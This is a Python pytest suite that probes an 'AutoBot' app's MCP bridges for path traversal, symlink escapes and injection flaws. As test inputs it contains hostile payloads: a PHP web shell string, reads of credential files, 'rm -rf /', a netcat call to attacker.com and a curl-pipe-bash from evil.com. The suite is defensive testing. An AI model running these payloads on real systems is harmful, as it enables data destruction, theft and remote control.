"""
Security Penetration Testing for AutoBot MCP Bridges

This test suite verifies security controls across all MCP bridges:
- Filesystem MCP: Path traversal, symlink attacks, access control
- All MCP Bridges: Input validation, injection attacks, size limits
- MCP Registry: Security of aggregation and routing

Test Categories:
1. Path Traversal Prevention
2. Symlink Attack Prevention
3. Access Control Enforcement
4. Input Validation (SQL injection, XSS, command injection, etc.)
5. Size and Rate Limiting
6. MCP Registry Security

Issue: #47 - Security Penetration Testing for MCP Bridges
"""

from pathlib import Path

import pytest
from fastapi.testclient import TestClient

# Import MCP bridges
from backend.api.filesystem_mcp import ALLOWED_DIRECTORIES, is_path_allowed
from backend.app_factory import create_app


@pytest.fixture
def app():
    """Create FastAPI test application"""
    return create_app()


@pytest.fixture
def client(app):
    """Create test client"""
    return TestClient(app)


@pytest.fixture
def temp_allowed_dir(tmp_path):
    """Create temporary directory within allowed paths for testing"""
    # Use /tmp/autobot/ which is in ALLOWED_DIRECTORIES
    test_dir = Path("/tmp/autobot/test_security")
    test_dir.mkdir(parents=True, exist_ok=True)
    yield test_dir
    # Cleanup
    import shutil

    if test_dir.exists():
        shutil.rmtree(test_dir)


@pytest.fixture
def temp_forbidden_dir(tmp_path):
    """Create temporary directory OUTSIDE allowed paths"""
    forbidden_dir = tmp_path / "forbidden_area"
    forbidden_dir.mkdir(parents=True, exist_ok=True)
    yield forbidden_dir
    # Cleanup handled by pytest tmp_path


# ============================================================================
# TEST CLASS 1: Filesystem MCP - Path Traversal Prevention
# ============================================================================


class TestFilesystemMCPPathTraversal:
    """Test filesystem MCP protection against path traversal attacks"""

    def test_path_traversal_basic(self):
        """Test basic path traversal attempts are blocked"""
        traversal_attempts = [
            "../../../etc/passwd",
            "../../../../../../etc/passwd",
            "/tmp/autobot/../../../etc/passwd",
            "/home/kali/Desktop/AutoBot/../../../../../../etc/passwd",
        ]

        for attack_path in traversal_attempts:
            result = is_path_allowed(attack_path)
            assert result is False, f"Path traversal not blocked: {attack_path}"

    def test_path_traversal_url_encoded(self):
        """Test URL-encoded path traversal attempts are blocked"""
        # URL-encoded traversal patterns
        traversal_attempts = [
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # ../../../etc/passwd
            "..%2f..%2f..%2fetc%2fpasswd",  # Mixed encoding
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",  # Partial encoding
        ]

        for attack_path in traversal_attempts:
            result = is_path_allowed(attack_path)
            assert result is False, f"URL-encoded traversal not blocked: {attack_path}"

    def test_path_traversal_double_encoded(self):
        """Test double URL-encoded path traversal"""
        # Double-encoded patterns
        attack_path = "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
        result = is_path_allowed(attack_path)
        assert result is False, f"Double-encoded traversal not blocked: {attack_path}"

    def test_path_traversal_windows_style(self):
        """Test Windows-style path traversal attempts"""
        traversal_attempts = [
            "..\\..\\..\\etc\\passwd",
            "/tmp/autobot/..\\..\\..\\etc\\passwd",
            "..\\..\\windows\\system32\\config\\sam",
        ]

        for attack_path in traversal_attempts:
            result = is_path_allowed(attack_path)
            assert (
                result is False
            ), f"Windows-style traversal not blocked: {attack_path}"

    def test_path_traversal_null_byte(self):
        """Test null byte injection in paths"""
        traversal_attempts = [
            "/tmp/autobot/file.txt\x00../../etc/passwd",
            "../../../etc/passwd\x00.txt",
            "/tmp/autobot\x00/../../../etc/passwd",
        ]

        for attack_path in traversal_attempts:
            result = is_path_allowed(attack_path)
            assert result is False, f"Null byte injection not blocked: {attack_path}"

    def test_path_traversal_unicode_normalization(self):
        """Test Unicode normalization attacks"""
        # Unicode variations of '../'
        traversal_attempts = [
            "\u002e\u002e\u002f\u002e\u002e\u002fetc\u002fpasswd",  # Unicode dots/slashes
            "﹒﹒/﹒﹒/etc/passwd",  # Small form variation
            "‥/‥/etc/passwd",  # Two dot leader
        ]

        for attack_path in traversal_attempts:
            result = is_path_allowed(attack_path)
            assert result is False, f"Unicode traversal not blocked: {attack_path}"

    def test_allowed_paths_are_permitted(self):
        """Test that legitimate paths within allowed directories are permitted"""
        allowed_paths = [
            "/home/kali/Desktop/AutoBot/backend/api/test.py",
            "/tmp/autobot/temp_file.txt",
            "/home/kali/Desktop/test_file.json",
        ]

        for path in allowed_paths:
            result = is_path_allowed(path)
            assert result is True, f"Legitimate path was blocked: {path}"

    def test_path_traversal_via_api(self, client):
        """Test path traversal protection via filesystem MCP API"""
        attack_payloads = [
            {"path": "../../../etc/passwd"},
            {"path": "/tmp/autobot/../../../etc/passwd"},
            {"path": "%2e%2e%2f%2e%2e%2fetc%2fpasswd"},
        ]

        for payload in attack_payloads:
            response = client.post("/api/filesystem/mcp/read_text_file", json=payload)
            # Should either return 400 (validation error) or 403 (forbidden)
            assert response.status_code in [400, 403, 422], (
                f"API did not block path traversal: {payload['path']}, "
                f"status: {response.status_code}"
            )


# ============================================================================
# TEST CLASS 2: Filesystem MCP - Symlink Attack Prevention
# ============================================================================


class TestFilesystemMCPSymlinkAttacks:
    """Test filesystem MCP protection against symlink attacks"""

    def test_symlink_to_forbidden_directory(self, temp_allowed_dir, temp_forbidden_dir):
        """Test that symlinks pointing outside allowed directories are blocked"""
        # Create file in forbidden directory
        forbidden_file = temp_forbidden_dir / "secret.txt"
        forbidden_file.write_text("SECRET DATA")

        # Create symlink in allowed directory pointing to forbidden file
        symlink_path = temp_allowed_dir / "link_to_secret.txt"
        symlink_path.symlink_to(forbidden_file)

        # Verify symlink is blocked
        result = is_path_allowed(str(symlink_path))
        assert result is False, "Symlink to forbidden directory was not blocked"

    def test_symlink_within_allowed_directory(self, temp_allowed_dir):
        """Test that symlinks within allowed directories are permitted"""
        # Create file in allowed directory
        original_file = temp_allowed_dir / "original.txt"
        original_file.write_text("ALLOWED DATA")

        # Create symlink in same allowed directory
        symlink_path = temp_allowed_dir / "link_to_original.txt"
        symlink_path.symlink_to(original_file)

        # Verify symlink is allowed
        result = is_path_allowed(str(symlink_path))
        assert result is True, "Legitimate symlink within allowed directory was blocked"

    def test_symlink_chain_escaping(self, temp_allowed_dir, temp_forbidden_dir):
        """Test symlink chain that attempts to escape allowed directories"""
        # Create file in forbidden directory
        forbidden_file = temp_forbidden_dir / "target.txt"
        forbidden_file.write_text("SECRET")

        # Create intermediate symlink
        intermediate_link = temp_allowed_dir / "intermediate"
        intermediate_link.symlink_to(temp_forbidden_dir)

        # Create final symlink
        final_link = temp_allowed_dir / "final_link"
        final_link.symlink_to(intermediate_link / "target.txt")

        # Verify chain is blocked
        result = is_path_allowed(str(final_link))
        assert result is False, "Symlink chain escape was not blocked"

    def test_directory_symlink_escape(self, temp_allowed_dir, temp_forbidden_dir):
        """Test directory symlink pointing outside allowed paths"""
        # Create symlink directory pointing to forbidden area
        symlink_dir = temp_allowed_dir / "forbidden_link"
        symlink_dir.symlink_to(temp_forbidden_dir)

        # Try to access file through symlink directory
        attack_path = symlink_dir / "secret.txt"

        result = is_path_allowed(str(attack_path))
        assert result is False, "Directory symlink escape was not blocked"


# ============================================================================
# TEST CLASS 3: Filesystem MCP - Access Control
# ============================================================================


class TestFilesystemMCPAccessControl:
    """Test filesystem MCP access control enforcement"""

    def test_forbidden_system_paths(self):
        """Test that critical system paths are blocked"""
        forbidden_paths = [
            "/etc/passwd",
            "/etc/shadow",
            "/root/.ssh/id_rsa",
            "/var/log/auth.log",
            "/proc/self/mem",
            "/sys/kernel/security",
            "/boot/grub/grub.cfg",
        ]

        for path in forbidden_paths:
            result = is_path_allowed(path)
            assert result is False, f"Critical system path not blocked: {path}"

    def test_allowed_directories_list(self):
        """Test that ALLOWED_DIRECTORIES list is properly configured"""
        assert len(ALLOWED_DIRECTORIES) > 0, "No allowed directories configured"

        # Verify expected directories are in whitelist
        expected_dirs = [
            "/home/kali/Desktop/AutoBot/",
            "/tmp/autobot/",
            "/home/kali/Desktop/",
        ]

        for expected in expected_dirs:
            assert (
                expected in ALLOWED_DIRECTORIES
            ), f"Expected directory missing from whitelist: {expected}"

    def test_access_to_parent_of_allowed(self):
        """Test that parent directories of allowed paths are blocked"""
        # /home/kali/Desktop/ is allowed, but /home/kali/ should be blocked
        blocked_paths = [
            "/home/kali/private_file.txt",
            "/home/kali/.ssh/id_rsa",
            "/home/kali/.bashrc",
        ]

        for path in blocked_paths:
            result = is_path_allowed(path)
            assert result is False, f"Parent directory access not blocked: {path}"

    def test_write_protection_via_api(self, client):
        """Test write operations to forbidden paths via API"""
        forbidden_write_attempts = [
            {"path": "/etc/passwd", "content": "MALICIOUS"},
            {"path": "/root/.ssh/authorized_keys", "content": "ssh-rsa AAAA..."},
            {
                "path": "/var/www/html/backdoor.php",
                "content": "<?php system($_GET['cmd']); ?>",
            },
        ]

        for payload in forbidden_write_attempts:
            response = client.post("/api/filesystem/mcp/write_file", json=payload)
            assert response.status_code in [
                400,
                403,
                422,
            ], f"Write to forbidden path not blocked: {payload['path']}"


# ============================================================================
# TEST CLASS 4: Input Validation Across All MCP Bridges
# ============================================================================


class TestMCPInputValidation:
    """Test input validation for all MCP bridges"""

    def test_sql_injection_attempts(self, client):
        """Test SQL injection protection across MCP tools"""
        sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM users--",
            "1; DELETE FROM sessions WHERE 1=1--",
        ]

        # Test filesystem MCP
        for payload in sql_injection_payloads:
            response = client.post(
                "/api/filesystem/mcp/search_files",
                json={"path": "/tmp/autobot", "pattern": payload},
            )
            # Should handle safely (not crash)
            assert response.status_code in [
                200,
                400,
                422,
            ], f"SQL injection caused unexpected response: {payload}"

    def test_xss_injection_attempts(self, client):
        """Test XSS protection in MCP tools"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>",
        ]

        # Test sequential thinking MCP (accepts user text)
        for payload in xss_payloads:
            response = client.post(
                "/api/sequential_thinking/mcp/sequential_thinking",
                json={
                    "thought": payload,
                    "thought_number": 1,
                    "total_thoughts": 1,
                    "next_thought_needed": False,
                },
            )
            # Should handle safely without executing scripts
            assert response.status_code in [200, 400, 422]

    def test_command_injection_attempts(self, client):
        """Test command injection protection"""
        command_injection_payloads = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 4444",
            "test `whoami`",
            "test $(curl evil.com/backdoor.sh | bash)",
        ]

        # Test filesystem operations
        for payload in command_injection_payloads:
            response = client.post(
                "/api/filesystem/mcp/create_directory",
                json={"path": f"/tmp/autobot/{payload}"},
            )
            # Should either sanitize or reject
            assert response.status_code in [200, 400, 403, 422]

    def test_null_byte_injection(self, client):
        """Test null byte injection protection"""
        null_byte_payloads = [
            "file.txt\x00.exe",
            "safe.txt\x00../../etc/passwd",
            "test\x00malicious",
        ]

        for payload in null_byte_payloads:
            response = client.post(
                "/api/filesystem/mcp/read_text_file",
                json={"path": f"/tmp/autobot/{payload}"},
            )
            assert response.status_code in [
                400,
                403,
                422,
            ], "Null byte injection not properly handled"

    def test_integer_overflow_attempts(self, client):
        """Test integer overflow protection"""
        overflow_payloads = [
            {
                "thought_number": 2**63,
                "total_thoughts": 1,
                "next_thought_needed": False,
            },
            {"thought_number": -1, "total_thoughts": 1, "next_thought_needed": False},
            {
                "thought_number": 1,
                "total_thoughts": 2**63,
                "next_thought_needed": False,
            },
        ]

        for payload in overflow_payloads:
            payload["thought"] = "test"
            response = client.post(
                "/api/sequential_thinking/mcp/sequential_thinking", json=payload
            )
            # Should validate and reject invalid integers
            assert response.status_code in [
                400,
                422,
            ], f"Integer overflow not validated: {payload}"

    def test_unicode_normalization_attacks(self, client):
        """Test Unicode normalization attack prevention"""
        unicode_payloads = [
            "\u202e/etc/passwd",  # Right-to-left override
            "file\ufeff.txt",  # Zero-width no-break space
            "test\u200b.txt",  # Zero-width space
        ]

        for payload in unicode_payloads:
            response = client.post(
                "/api/filesystem/mcp/read_text_file",
                json={"path": f"/tmp/autobot/{payload}"},
            )
            # Should handle Unicode safely
            assert response.status_code in [200, 400, 404, 422]

    def test_ldap_injection_attempts(self, client):
        """Test LDAP injection protection (if applicable)"""
        ldap_payloads = [
            "*)(uid=*))(|(uid=*",
            "admin)(&(password=*))",
            "*)(objectClass=*",
        ]

        # Test search operations
        for payload in ldap_payloads:
            response = client.post(
                "/api/filesystem/mcp/search_files",
                json={"path": "/tmp/autobot", "pattern": payload},
            )
            assert response.status_code in [200, 400, 422]


# ============================================================================
# TEST CLASS 5: Size and Rate Limiting
# ============================================================================


class TestMCPSizeLimiting:
    """Test size and rate limiting for MCP operations"""

    def test_large_file_read_protection(self, client, temp_allowed_dir):
        """Test protection against reading extremely large files"""
        # Create a large file (10MB)
        large_file = temp_allowed_dir / "large_file.txt"
        large_file.write_bytes(b"X" * (10 * 1024 * 1024))

        response = client.post(
            "/api/filesystem/mcp/read_text_file", json={"path": str(large_file)}
        )

        # Should either succeed or have reasonable limits
        # (Implementation may have size limits or chunking)
        assert response.status_code in [200, 400, 413, 422]

    def test_extremely_long_thought(self, client):
        """Test protection against extremely long thought content"""
        # 1MB thought content
        long_thought = "A" * (1024 * 1024)

        response = client.post(
            "/api/sequential_thinking/mcp/sequential_thinking",
            json={
                "thought": long_thought,
                "thought_number": 1,
                "total_thoughts": 1,
                "next_thought_needed": False,
            },
        )

        # Should have size limits
        assert response.status_code in [200, 400, 413, 422]

    def test_excessive_file_list(self, client):
        """Test protection against reading excessive number of files"""
        # Try to read 1000 files at once
        file_paths = [f"/tmp/autobot/file{i}.txt" for i in range(1000)]

        response = client.post(
            "/api/filesystem/mcp/read_multiple_files", json={"paths": file_paths}
        )

        # Should have limits on batch operations
        assert response.status_code in [200, 400, 422]


# ============================================================================
# TEST CLASS 6: MCP Registry Security
# ============================================================================


class TestMCPRegistrySecurity:
    """Test security of MCP Registry aggregation system"""

    def test_registry_tools_endpoint(self, client):
        """Test MCP registry tools endpoint security"""
        response = client.get("/api/mcp/tools")
        assert response.status_code == 200

        data = response.json()
        assert "tools" in data
        assert "total_tools" in data

    def test_registry_bridges_endpoint(self, client):
        """Test MCP registry bridges endpoint security"""
        response = client.get("/api/mcp/bridges")
        assert response.status_code == 200

        data = response.json()
        assert "bridges" in data
        assert "total_bridges" in data

    def test_registry_path_injection(self, client):
        """Test path injection in registry endpoints"""
        injection_attempts = [
            "../../../etc/passwd",
            "../../knowledge_mcp",
            "filesystem_mcp/../../etc/passwd",
        ]

        for attack in injection_attempts:
            response = client.get(f"/api/mcp/tools/{attack}/some_tool")
            # Should reject invalid bridge names
            assert response.status_code in [400, 404, 422]

    def test_registry_tool_name_injection(self, client):
        """Test tool name injection in registry"""
        injection_attempts = [
            "../../etc/passwd",
            "<script>alert('xss')</script>",
            "'; DROP TABLE tools; --",
        ]

        for attack in injection_attempts:
            response = client.get(f"/api/mcp/tools/filesystem_mcp/{attack}")
            # Should sanitize or reject malicious tool names
            assert response.status_code in [400, 404, 422]

    def test_registry_health_endpoint(self, client):
        """Test MCP registry health endpoint security"""
        response = client.get("/api/mcp/health")
        assert response.status_code == 200

        data = response.json()
        assert "status" in data
        assert "total_bridges" in data


# ============================================================================
# TEST CLASS 7: Structured Thinking MCP Security
# ============================================================================


class TestStructuredThinkingMCPSecurity:
    """Test security of structured thinking MCP bridge"""

    def test_stage_validation(self, client):
        """Test that invalid stages are rejected"""
        invalid_stages = [
            "invalid_stage",
            "<script>alert('xss')</script>",
            "'; DROP TABLE thoughts; --",
            "../../../etc/passwd",
        ]

        for stage in invalid_stages:
            response = client.post(
                "/api/structured_thinking/mcp/process_thought",
                json={"stage": stage, "thought": "test thought"},
            )
            # Should validate stage names
            assert response.status_code in [400, 422]

    def test_excessive_thought_history(self, client):
        """Test protection against excessive thought history"""
        # Try to create 10,000 thoughts in single session
        session_id = "test_session_overflow"

        for i in range(100):  # Test with 100 for performance
            response = client.post(
                "/api/structured_thinking/mcp/process_thought",
                json={
                    "stage": "problem_definition",
                    "thought": f"Thought {i}",
                    "session_id": session_id,
                },
            )
            # Should handle gracefully
            assert response.status_code in [200, 400, 429]  # 429 = rate limit


# ============================================================================
# TEST EXECUTION MARKERS
# ============================================================================


@pytest.mark.security
@pytest.mark.high_priority
class TestSecurityCoverage:
    """Meta-tests to verify security test coverage"""

    def test_all_mcp_bridges_tested(self):
        """Verify all MCP bridges have security tests"""
        tested_bridges = {
            "filesystem_mcp",
            "sequential_thinking_mcp",
            "structured_thinking_mcp",
            "mcp_registry",
        }

        # From mcp_registry.py:
        expected_bridges = {
            "filesystem_mcp",
            "sequential_thinking_mcp",
            "structured_thinking_mcp",
            "knowledge_mcp",
            "vnc_mcp",
        }

        # All bridges should have at least input validation tests
        assert tested_bridges.issubset(
            expected_bridges
        ), "Not all MCP bridges have security tests"

    def test_critical_attack_vectors_covered(self):
        """Verify all critical attack vectors are tested"""
        covered_attacks = {
            "path_traversal",
            "symlink_attacks",
            "sql_injection",
            "xss_injection",
            "command_injection",
            "null_byte_injection",
            "unicode_normalization",
            "integer_overflow",
            "ldap_injection",
        }

        # Verify this list matches our test classes
        assert len(covered_attacks) >= 9, "Not all critical attack vectors are covered"


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
